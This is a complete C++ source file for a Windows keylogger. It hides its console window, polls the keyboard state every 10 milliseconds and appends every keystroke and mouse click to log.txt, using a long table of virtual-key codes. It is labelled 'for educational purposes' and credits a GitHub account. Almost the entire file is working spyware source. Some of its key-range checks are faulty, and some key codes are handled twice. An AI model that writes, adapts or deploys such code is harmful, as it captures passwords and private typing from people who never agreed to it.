//keylogger.cpp
//ATTENTION! Use this code only for educational purposes!
#include <iostream>
#include <windows.h>

using namespace std;

int Save(int _key, char *file);

int main() {
	
	FreeConsole();
  
	char i;
	
	while(true) {
		Sleep(10);
		for(i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767)
				Save(i, "log.txt");
		}
	}
}

int Save(int _key, char *file) {

	cout << _key << endl;
	
	Sleep(10);
	
	FILE *OUTPUT_FILE;
	
	OUTPUT_FILE = fopen(file, "a+");
	if (_key == 0x0D) //VK_RETURN, ENTER key
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (_key == 0x1B) //VK_ESCAPE, ESC key
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if (_key == 0x5F) //VK_SLEEP, Computer Sleep key
		fprintf(OUTPUT_FILE, "%s", "[Computer Sleep]");
	else if (_key == 0x20) //VK_SPACE
		fprintf(OUTPUT_FILE, "%s", "[SPACEBAR]");
	else if (_key == 0x08) //VK_BACK, BACKSPACE key
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (_key == 0x09) //VK_TAB, TAB key
		fprintf(OUTPUT_FILE, "%s", "[TAB]");

	//Reserved
	//else if (_key == 0x0A-0B) //Reserved
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0x5E) //Reserved
		fprintf(OUTPUT_FILE, "%s", "[-]");
	//else if (_key == 0xB8-B9) //Reserved
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	//else if (_key == 0xC1-D7) //Reserved
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0xE0) //Reserved
		fprintf(OUTPUT_FILE, "%s", "[-]");
	
	//SHIFT
	else if (_key == 0xA0) //VK_LSHIFT, Left SHIFT key
		fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
	else if (_key == 0xA1) //VK_RSHIFT, Right SHIFT key
		fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
	else if (_key == 0x10) //VK_SHIFT, SHIFT key
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	
	//CTRL
	else if (_key == 0xA2) //VK_LCONTROL, Left CONTROL key
		fprintf(OUTPUT_FILE, "%s", "[LCTRL]");
	else if (_key == 0xA3) //VK_RCONTROL, Right CONTROL key
		fprintf(OUTPUT_FILE, "%s", "[RCTRL]");
	else if (_key == 0x11) //VK_CONTROL, CTRL key
		fprintf(OUTPUT_FILE, "%s", "[CTRL]");

	//MENU
	else if (_key == 0xA4) //VK_LMENU, Left MENU key
		fprintf(OUTPUT_FILE, "%s", "[LMENU]");
	else if (_key == 0xA5) //VK_RMENU, Right MENU key
		fprintf(OUTPUT_FILE, "%s", "[RMENU]");
	else if (_key == 0x12) //VK_MENU, ALT key
		fprintf(OUTPUT_FILE, "%s", "[MENU]");

	//Browser
	else if (_key == 0xA6) //VK_BROWSER_BACK, Browser Back key
		fprintf(OUTPUT_FILE, "%s", "[BrowserBack]");
	else if (_key == 0xA7) //VK_BROWSER_FORWARD, Browser Forward key
		fprintf(OUTPUT_FILE, "%s", "[BrowserForward]");
	else if (_key == 0xA8) //VK_BROWSER_REFRESH, Browser Refresh key
		fprintf(OUTPUT_FILE, "%s", "[BrowserRefresh]");
	else if (_key == 0xA9) //VK_BROWSER_STOP, Browser Stop key
		fprintf(OUTPUT_FILE, "%s", "[BrowserStop]");
	else if (_key == 0xAA) //VK_BROWSER_SEARCH, Browser Search key
		fprintf(OUTPUT_FILE, "%s", "[BrowserSearch]");
	else if (_key == 0xAB) //VK_BROWSER_FAVORITES, Browser Favorites key
		fprintf(OUTPUT_FILE, "%s", "[BrowserFavorites]");
	else if (_key == 0xAC) //VK_BROWSER_HOME, Browser Start and Home key
		fprintf(OUTPUT_FILE, "%s", "[BrowserStart and Home]");
	
	//Volume
	else if (_key == 0xAD) //VK_VOLUME_MUTE, Volume Mute key
		fprintf(OUTPUT_FILE, "%s", "[VolMute]");
	else if (_key == 0xAE) //VK_VOLUME_DOWN, Volume Down key
		fprintf(OUTPUT_FILE, "%s", "[VolDown]");
	else if (_key == 0xAF) //VK_VOLUME_UP, Volume Up key
		fprintf(OUTPUT_FILE, "%s", "[VolUp]");
	
	//Media
	else if (_key == 0xB5) //VK_LAUNCH_MEDIA_SELECT, Select Media key
		fprintf(OUTPUT_FILE, "%s", "[SelectMedia]");
	else if (_key == 0xB0) //VK_MEDIA_NEXT_TRACK, Next Track key
		fprintf(OUTPUT_FILE, "%s", "[NextTrack]");
	else if (_key == 0xB1) //VK_MEDIA_PREV_TRACK, Previous Track key
		fprintf(OUTPUT_FILE, "%s", "[PreviousTrack]");
	else if (_key == 0xB2) //VK_MEDIA_STOP, Stop Media key
		fprintf(OUTPUT_FILE, "%s", "[StopMedia]");
	else if (_key == 0xB3) //VK_MEDIA_PLAY_PAUSE, Play/Pause Media key
		fprintf(OUTPUT_FILE, "%s", "[Play/Pause Media]");

	else if (_key == 0xB4) //VK_LAUNCH_MAIL, Start Mail key
		fprintf(OUTPUT_FILE, "%s", "[Start Mail]");

	//Start Application
	else if (_key == 0xB6) //VK_LAUNCH_APP1, Start Application 1 key
		fprintf(OUTPUT_FILE, "%s", "[StartApp1]");
	else if (_key == 0xB7) //VK_LAUNCH_APP2, Start Application 2 key
		fprintf(OUTPUT_FILE, "%s", "[StartApp2]");

	//OEM specific
	else if (_key == 0x92-96) //OEM specific
		fprintf(OUTPUT_FILE, "%s", "[OEMspec]");
	else if (_key == 0xE1) //OEM specific
		fprintf(OUTPUT_FILE, "%s", "[OEMspec]");
	//else if (_key == 0xE3-E4) //OEM specific
	//	fprintf(OUTPUT_FILE, "%s", "[OEMspec]");
	else if (_key == 0xE6) //OEM specific
		fprintf(OUTPUT_FILE, "%s", "[OEMspec]");
	//else if (_key == 0xE9-F5) //OEM specific
	//	fprintf(OUTPUT_FILE, "%s", "[OEMspec]");
	
	//OEM
	else if (_key == 0xBA) //VK_OEM_1, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the ';:' key
		fprintf(OUTPUT_FILE, "%s", "[OEM1 ;:]");
	else if (_key == 0xBB) //VK_OEM_PLUS, For any country/region, the '+' key
		fprintf(OUTPUT_FILE, "%s", "[+]");
	else if (_key == 0xBC) //VK_OEM_COMMA, For any country/region, the ',' key
		fprintf(OUTPUT_FILE, "%s", "[,]");
	else if (_key == 0xBD) //VK_OEM_MINUS, For any country/region, the '-' key
		fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0xBE) //VK_OEM_PERIOD, For any country/region, the '.' key
		fprintf(OUTPUT_FILE, "%s", "[.]");
	else if (_key == 0xBF) //VK_OEM_2, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '/?' key
		fprintf(OUTPUT_FILE, "%s", "[OEM2 /?]");
	else if (_key == 0xC0) //VK_OEM_3, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '`~' key
		fprintf(OUTPUT_FILE, "%s", "[OEM3 `~]");
	else if (_key == 0xDB) //VK_OEM_4, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '[{' key
		fprintf(OUTPUT_FILE, "%s", "[OEM4 [{]");
	else if (_key == 0xDC) //VK_OEM_5, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the '\|' key
		fprintf(OUTPUT_FILE, "%s", "[OEM5 \\|]");
	else if (_key == 0xDD) //VK_OEM_6, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the ']}' key
		fprintf(OUTPUT_FILE, "%s", "[OEM6 ]}]");
	else if (_key == 0xDE) //VK_OEM_7, Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the 'single-quote/double-quote' key
		fprintf(OUTPUT_FILE, "%s", "[OEM7 single-quote/double-quote]");
	else if (_key == 0xDF) //VK_OEM_8, Used for miscellaneous characters; it can vary by keyboard.
		fprintf(OUTPUT_FILE, "%s", "[OEM8]");
	else if (_key == 0xE2) //VK_OEM_102, Either the angle bracket key or the backslash key on the RT 102-key keyboard
		fprintf(OUTPUT_FILE, "%s", "[OEM102]");

	else if (_key == 0xF6) //VK_ATTN, Attn key
		fprintf(OUTPUT_FILE, "%s", "[Attn]");
	else if (_key == 0xF7) //VK_CRSEL, CrSel key
		fprintf(OUTPUT_FILE, "%s", "[CrSel]");
	else if (_key == 0xF8) //VK_EXSEL, ExSel key
		fprintf(OUTPUT_FILE, "%s", "[ExSel]");
	else if (_key == 0xF9) //VK_EREOF, Erase EOF key
		fprintf(OUTPUT_FILE, "%s", "[EraseEOF]");
	else if (_key == 0xFA) //VK_PLAY, Play key
		fprintf(OUTPUT_FILE, "%s", "[Play]");
	else if (_key == 0xFB) //VK_ZOOM, Zoom key
		fprintf(OUTPUT_FILE, "%s", "[Zoom]");
	else if (_key == 0xFC) //VK_NONAME, Reserved
		fprintf(OUTPUT_FILE, "%s", "[Reserved]");
	else if (_key == 0xFD) //VK_PA1, PA1 key
		fprintf(OUTPUT_FILE, "%s", "[PA1]");
	else if (_key == 0xFE) //VK_OEM_CLEAR, Clear key
		fprintf(OUTPUT_FILE, "%s", "[Clear]");

	else if (_key == 0xE7) //VK_PACKET, Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP
		fprintf(OUTPUT_FILE, "%s", "[VK_PACKET]");
	
	else if (_key == 0x13) //VK_PAUSE, PAUSE key
		fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
	
	//IME
	else if (_key == 0xE5) //VK_PROCESSKEY, IME PROCESS key
		fprintf(OUTPUT_FILE, "%s", "[IMEPROCESS]");
	else if (_key == 0x15) //VK_KANA, IME Kana mode
		fprintf(OUTPUT_FILE, "%s", "[IMEKana]");
	//else if (_key == 0x15) //VK_HANGUEL, IME Hanguel mode
	//	fprintf(OUTPUT_FILE, "%s", "[IMEHanguel]");
	else if (_key == 0x15) //VK_HANGUL, IME Hanguel mode
		fprintf(OUTPUT_FILE, "%s", "[IMEHanguel]");
	else if (_key == 0x17) //VK_JUNJA, IME Junja mode
		fprintf(OUTPUT_FILE, "%s", "[IMEJunja]");
	else if (_key == 0x18) //VK_FINAL, IME final mode
		fprintf(OUTPUT_FILE, "%s", "[IMEfinal]");
	else if (_key == 0x19) //VK_HANJA, IME Hanja mode
		fprintf(OUTPUT_FILE, "%s", "[IMEHanja]");
	else if (_key == 0x19) //VK_KANJI, IME Kanji mode
		fprintf(OUTPUT_FILE, "%s", "[IMEKanji]");
	else if (_key == 0x1C) //VK_CONVERT, IME convert
		fprintf(OUTPUT_FILE, "%s", "[IMEconvert]");
	else if (_key == 0x1D) //VK_NONCONVERT, IME nonconvert
		fprintf(OUTPUT_FILE, "%s", "[IMEnonconvert]");
	else if (_key == 0x1E) //VK_ACCEPT, IME accept
		fprintf(OUTPUT_FILE, "%s", "[IMEaccept]");
	else if (_key == 0x1F) //VK_MODECHANGE, IME mode change request
		fprintf(OUTPUT_FILE, "%s", "[IME mode change request]");
	
	//ARROWS
	else if (_key == 0x25) //VK_LEFT, LEFT ARROW key
		fprintf(OUTPUT_FILE, "%s", "[LARR]");
	else if (_key == 0x27) //VK_RIGHT, RIGHT ARROW key
		fprintf(OUTPUT_FILE, "%s", "[RARR]");
	else if (_key == 0x26) //VK_UP, UP ARROW key
		fprintf(OUTPUT_FILE, "%s", "[UARR]");
	else if (_key == 0x28) //VK_DOWN, DOWN ARROW key
		fprintf(OUTPUT_FILE, "%s", "[DARR]");

	//Natural keyboard
	else if (_key == 0x5B) //VK_LWIN, Left Windows key (Natural keyboard)
		fprintf(OUTPUT_FILE, "%s", "[LWinkey]");
	else if (_key == 0x5C) //VK_RWIN, Right Windows key (Natural keyboard)
		fprintf(OUTPUT_FILE, "%s", "[RWinkey]");
	else if (_key == 0x5D) //VK_APPS, Applications key (Natural keyboard)
		fprintf(OUTPUT_FILE, "%s", "[Appkey]");
	
	//Numeric keypad
	else if (_key == 0x60) //VK_NUMPAD0, Numeric keypad 0 key
		fprintf(OUTPUT_FILE, "%s", "[Num0]");
	else if (_key == 0x61) //VK_NUMPAD1, Numeric keypad 1 key
		fprintf(OUTPUT_FILE, "%s", "[Num1]");
	else if (_key == 0x62) //VK_NUMPAD2, Numeric keypad 2 key
		fprintf(OUTPUT_FILE, "%s", "[Num2]");
	else if (_key == 0x63) //VK_NUMPAD3, Numeric keypad 3 key
		fprintf(OUTPUT_FILE, "%s", "[Num3]");
	else if (_key == 0x64) //VK_NUMPAD4, Numeric keypad 4 key
		fprintf(OUTPUT_FILE, "%s", "[Num4]");
	else if (_key == 0x65) //VK_NUMPAD5, Numeric keypad 5 key
		fprintf(OUTPUT_FILE, "%s", "[Num5]");
	else if (_key == 0x66) //VK_NUMPAD6, Numeric keypad 6 key
		fprintf(OUTPUT_FILE, "%s", "[Num6]");
	else if (_key == 0x67) //VK_NUMPAD7, Numeric keypad 7 key
		fprintf(OUTPUT_FILE, "%s", "[Num7]");
	else if (_key == 0x68) //VK_NUMPAD8, Numeric keypad 8 key
		fprintf(OUTPUT_FILE, "%s", "[Num8]");
	else if (_key == 0x69) //VK_NUMPAD9, Numeric keypad 9 key
		fprintf(OUTPUT_FILE, "%s", "[Num9]");
		
	//Numeric
	else if (_key == 0x30) //0 key
		fprintf(OUTPUT_FILE, "%s", "[0]");
	else if (_key == 0x31) //1 key
		fprintf(OUTPUT_FILE, "%s", "[1]");
	else if (_key == 0x32) //2 key
		fprintf(OUTPUT_FILE, "%s", "[2]");
	else if (_key == 0x33) //3 key
		fprintf(OUTPUT_FILE, "%s", "[3]");
	else if (_key == 0x34) //4 key
		fprintf(OUTPUT_FILE, "%s", "[4]");
	else if (_key == 0x35) //5 key
		fprintf(OUTPUT_FILE, "%s", "[5]");
	else if (_key == 0x36) //6 key
		fprintf(OUTPUT_FILE, "%s", "[6]");
	else if (_key == 0x37) //7 key
		fprintf(OUTPUT_FILE, "%s", "[7]");
	else if (_key == 0x38) //8 key
		fprintf(OUTPUT_FILE, "%s", "[8]");
	else if (_key == 0x39) //9 key
		fprintf(OUTPUT_FILE, "%s", "[9]");
		
	//Letters ENG
	else if (_key == 0x41) //A key
		fprintf(OUTPUT_FILE, "%s", "[A]");
	else if (_key == 0x42) //B key
		fprintf(OUTPUT_FILE, "%s", "[B]");
	else if (_key == 0x43) //C key
		fprintf(OUTPUT_FILE, "%s", "[C]");
	else if (_key == 0x44) //D key
		fprintf(OUTPUT_FILE, "%s", "[D]");
	else if (_key == 0x45) //E key
		fprintf(OUTPUT_FILE, "%s", "[E]");
	else if (_key == 0x46) //F key
		fprintf(OUTPUT_FILE, "%s", "[F]");
	else if (_key == 0x47) //G key
		fprintf(OUTPUT_FILE, "%s", "[G]");
	else if (_key == 0x48) //H key
		fprintf(OUTPUT_FILE, "%s", "[H]");
	else if (_key == 0x49) //I key
		fprintf(OUTPUT_FILE, "%s", "[I]");
	else if (_key == 0x4A) //J key
		fprintf(OUTPUT_FILE, "%s", "[J]");
	else if (_key == 0x4B) //K key
		fprintf(OUTPUT_FILE, "%s", "[K]");
	else if (_key == 0x4C) //L key
		fprintf(OUTPUT_FILE, "%s", "[L]");
	else if (_key == 0x4D) //M key
		fprintf(OUTPUT_FILE, "%s", "[M]");
	else if (_key == 0x4E) //N key
		fprintf(OUTPUT_FILE, "%s", "[N]");
	else if (_key == 0x4F) //O key
		fprintf(OUTPUT_FILE, "%s", "[O]");
	else if (_key == 0x50) //P key
		fprintf(OUTPUT_FILE, "%s", "[P]");
	else if (_key == 0x51) //Q key
		fprintf(OUTPUT_FILE, "%s", "[Q]");
	else if (_key == 0x52) //R key
		fprintf(OUTPUT_FILE, "%s", "[R]");
	else if (_key == 0x53) //S key
		fprintf(OUTPUT_FILE, "%s", "[S]");
	else if (_key == 0x54) //T key
		fprintf(OUTPUT_FILE, "%s", "[T]");
	else if (_key == 0x55) //U key
		fprintf(OUTPUT_FILE, "%s", "[U]");
	else if (_key == 0x56) //V key
		fprintf(OUTPUT_FILE, "%s", "[V]");
	else if (_key == 0x57) //W key
		fprintf(OUTPUT_FILE, "%s", "[W]");
	else if (_key == 0x58) //S key
		fprintf(OUTPUT_FILE, "%s", "[X]");
	else if (_key == 0x59) //Y key
		fprintf(OUTPUT_FILE, "%s", "[Y]");
	else if (_key == 0x5A) //Z key
		fprintf(OUTPUT_FILE, "%s", "[Z]");

	else if (_key == 0x21) //VK_PRIOR
		fprintf(OUTPUT_FILE, "%s", "[PGUP]");
	else if (_key == 0x22) //VK_NEXT
		fprintf(OUTPUT_FILE, "%s", "[PGDN]");
	else if (_key == 0x23) //VK_END
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (_key == 0x24) //VK_HOME, HOME key
		fprintf(OUTPUT_FILE, "%s", "[HOME]");

	else if (_key == 0x6A) //VK_MULTIPLY, Multiply key
		fprintf(OUTPUT_FILE, "%s", "[Multiply]");
	else if (_key == 0x6B) //VK_ADD, Add key
		fprintf(OUTPUT_FILE, "%s", "[Add]");
	else if (_key == 0x6C) //VK_SEPARATOR, Separator key
		fprintf(OUTPUT_FILE, "%s", "[Separator]");
	else if (_key == 0x6D) //VK_SUBTRACT, Subtract key
		fprintf(OUTPUT_FILE, "%s", "[Subtract]");
	else if (_key == 0x6E) //VK_DECIMAL, Decimal key
		fprintf(OUTPUT_FILE, "%s", "[Decimal]");
	else if (_key == 0x6F) //VK_DIVIDE, Divide key
		fprintf(OUTPUT_FILE, "%s", "[Divide]");
	
	//F keys
	else if (_key == 0x70) //VK_F1, F1 key
		fprintf(OUTPUT_FILE, "%s", "[F1]");
	else if (_key == 0x71) //VK_F2, F2 key
		fprintf(OUTPUT_FILE, "%s", "[F2]");
	else if (_key == 0x72) //VK_F3, F3 key
		fprintf(OUTPUT_FILE, "%s", "[F3]");
	else if (_key == 0x73) //VK_F4, F4 key
		fprintf(OUTPUT_FILE, "%s", "[F4]");
	else if (_key == 0x74) //VK_F5, F5 key
		fprintf(OUTPUT_FILE, "%s", "[F5]");
	else if (_key == 0x75) //VK_F6, F6 key
		fprintf(OUTPUT_FILE, "%s", "[F6]");
	else if (_key == 0x76) //VK_F7, F7 key
		fprintf(OUTPUT_FILE, "%s", "[F7]");
	else if (_key == 0x77) //VK_F8, F8 key
		fprintf(OUTPUT_FILE, "%s", "[F8]");
	else if (_key == 0x78) //VK_F9, F9 key
		fprintf(OUTPUT_FILE, "%s", "[F9]");
	else if (_key == 0x79) //VK_F10, F10 key
		fprintf(OUTPUT_FILE, "%s", "[F10]");
	else if (_key == 0x7A) //VK_F11, F11 key
		fprintf(OUTPUT_FILE, "%s", "[F11]");
	else if (_key == 0x7B) //VK_F12, F12 key
		fprintf(OUTPUT_FILE, "%s", "[F12]");
	else if (_key == 0x7C) //VK_F13, F13 key
		fprintf(OUTPUT_FILE, "%s", "[F13]");
	else if (_key == 0x7D) //VK_F14, F14 key
		fprintf(OUTPUT_FILE, "%s", "[F14]");
	else if (_key == 0x7E) //VK_F15, F15 key
		fprintf(OUTPUT_FILE, "%s", "[F15]");
	else if (_key == 0x7F) //VK_F16, F16 key
		fprintf(OUTPUT_FILE, "%s", "[F16]");
	else if (_key == 0x80) //VK_F17, F17 key
		fprintf(OUTPUT_FILE, "%s", "[F17]");
	else if (_key == 0x81) //VK_F18, F18 key
		fprintf(OUTPUT_FILE, "%s", "[F18]");
	else if (_key == 0x82) //VK_F19, F19 key
		fprintf(OUTPUT_FILE, "%s", "[F19]");
	else if (_key == 0x83) //VK_F20, F20 key
		fprintf(OUTPUT_FILE, "%s", "[F20]");
	else if (_key == 0x84) //VK_F21, F21 key
		fprintf(OUTPUT_FILE, "%s", "[F21]");
	else if (_key == 0x85) //VK_F22, F22 key
		fprintf(OUTPUT_FILE, "%s", "[F22]");
	else if (_key == 0x86) //VK_F23, F23 key
		fprintf(OUTPUT_FILE, "%s", "[F23]");
	else if (_key == 0x87) //VK_F24, F24 key
		fprintf(OUTPUT_FILE, "%s", "[F24]");
		
	//LOCKS
	else if (_key == 0x90) //VK_NUMLOCK, NUM LOCK key
		fprintf(OUTPUT_FILE, "%s", "[NLOCK]");
	else if (_key == 0x91) //VK_SCROLL, SCROLL LOCK key
		fprintf(OUTPUT_FILE, "%s", "[SLOCK]");
	else if (_key == 0x14) //VK_CAPITAL, CAPS LOCK key
		fprintf(OUTPUT_FILE, "%s", "[CLOCK]");

	else if (_key == 0x29) //VK_SELECT, SELECT key
		fprintf(OUTPUT_FILE, "%s", "[SELECT]");
		
	else if (_key == 0x2A) //VK_PRINT, PRINT key
		fprintf(OUTPUT_FILE, "%s", "[PRINT]");
	else if (_key == 0x2B) //VK_EXECUTE, EXECUTE key
		fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
	else if (_key == 0x2C) //VK_SNAPSHOT, PRINT SCREEN key
		fprintf(OUTPUT_FILE, "%s", "[PRTSC]");
	else if (_key == 0x2D) //VK_INSERT, INS key
		fprintf(OUTPUT_FILE, "%s", "[INS]");
	else if (_key == 0x2E) //VK_DELETE, DEL key
		fprintf(OUTPUT_FILE, "%s", "[DEL]");
	else if (_key == 0x2F) //VK_HELP, HELP key
		fprintf(OUTPUT_FILE, "%s", "[HELP]");

	else if (_key == 0x03) //VK_CANCEL, Control-break processing
		fprintf(OUTPUT_FILE, "%s", "[CANCEL]");
	else if (_key == 0x0C) //VK_CLEAR, CLEAR key
		fprintf(OUTPUT_FILE, "%s", "[CLEAR]");

	//MOUSE
	else if (_key == 0x01) //VK_LBUTTON, Left mouse button
		fprintf(OUTPUT_FILE, "%s", "[LBUT]");
	else if (_key == 0x02) //VK_RBUTTON, Right mouse button
		fprintf(OUTPUT_FILE, "%s", "[RBUT]");
	else if (_key == 0x04) //VK_MBUTTON, Middle mouse button (three-button mouse)
		fprintf(OUTPUT_FILE, "%s", "[MBUT]");
	else if (_key == 0x05) //VK_XBUTTON1, X1 mouse button
		fprintf(OUTPUT_FILE, "%s", "[XBUT1]");
	else if (_key == 0x06) //VK_XBUTTON2, X2 mouse button
		fprintf(OUTPUT_FILE, "%s", "[XBUT2]");

	//Undefined
	else if (_key == 0x07) //Undefined
		fprintf(OUTPUT_FILE, "%s", "[-]");
	//else if (_key == 0x0E-0F) //Undefined
	//	fprintf(OUTPUT_FILE, "%s", "[-]");		
	else if (_key == 0x16) //Undefined
		fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0x1A) //Undefined
		fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0x3A-40) //Undefined
		fprintf(OUTPUT_FILE, "%s", "[-]");
	
	//Unassigned
	//else if (_key == 0x88-8F) //Unassigned
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	//else if (_key == 0x97-9F) //Unassigned
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	//else if (_key == 0xD8-DA) //Unassigned
	//	fprintf(OUTPUT_FILE, "%s", "[-]");
	else if (_key == 0xE8) //Unassigned
		fprintf(OUTPUT_FILE, "%s", "[-]");
	
	else
		fprintf(OUTPUT_FILE, "%s", &_key);
		
		fclose(OUTPUT_FILE);
	
	return 0;
}
//Enjoy learning new things! Prometheus111 helps you with your studying!
//https://github.com/Prometheus111 
